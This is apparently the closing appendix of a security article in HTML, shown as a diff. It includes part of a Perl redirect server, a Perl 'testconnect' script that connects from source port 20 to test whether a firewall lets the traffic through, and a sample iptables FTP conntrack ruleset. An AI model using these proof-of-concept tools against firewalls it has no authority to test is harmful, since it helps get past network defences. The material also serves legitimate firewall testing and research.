+my $request = &lt;$conn&gt;;<br>
+print $conn &quot;$redir&quot;;<br>
+$conn-&gt;close();<br>
+exit(0);<br>
+}<br>
+&lt;/html-redirect&gt;<br>
+<br>
+&lt;testconnect&gt;<br>
+#!/usr/bin/perl -w<br>
+<br>
+use IO::Socket;<br>
+<br>
+sub usage<br>
+{<br>
+print &quot;Usage: $0 &lt;Host&gt; &lt;Port&gt;\r\n&quot;;<br>
+exit 0;<br>
+}<br>
+<br>
+my $a = shift || usage();<br>
+my $b = shift || usage();<br>
+<br>
+my $conn = IO::Socket::INET-&gt;new(PeerAddr =&gt; $a,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+PeerPort =&gt; $b,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+LocalPort =&gt; 20,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Type =&gt; SOCK_STREAM,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Proto =&gt; 'tcp') or die $!;<br>
+<br>
+print $conn &quot;GOTCHA\r\n&quot;;<br>
+$conn-&gt;close();<br>
+&lt;/testconnect&gt;<br>
+<br>
+&lt;conntrack-start&gt;<br>
+#!/bin/sh<br>
+<br>
+# sample FTP session tracked firewall for 2.4 linux kernels<br>
+# modprobe ip_conntrack_ftp<br>
+<br>
+iptables -F<br>
+<br>
+iptables -A INPUT -p tcp --sport 21 -m state --state ESTABLISHED -j ACCEPT<br>
+iptables -A OUTPUT -p tcp --dport 21 -m state --state NEW,ESTABLISHED -j ACCEPT<br>
+<br>
+iptables -A INPUT -p tcp --sport 20 -m state --state ESTABLISHED,RELATED -j 
+ACCEPT<br>
+iptables -A OUTPUT -p tcp --dport 20 -m state --state ESTABLISHED -j ACCEPT<br>
+<br>
+#iptables -A INPUT -p tcp --syn -j LOG<br>
+iptables -A INPUT -p tcp --syn -j DROP<br>
+&lt;/conntrack-start&gt;<br>
+<br>
+|=[ EOF ]=---------------------------------------------------------------=|<br>
+&nbsp;</p>
+
+</body>
+
+</html>
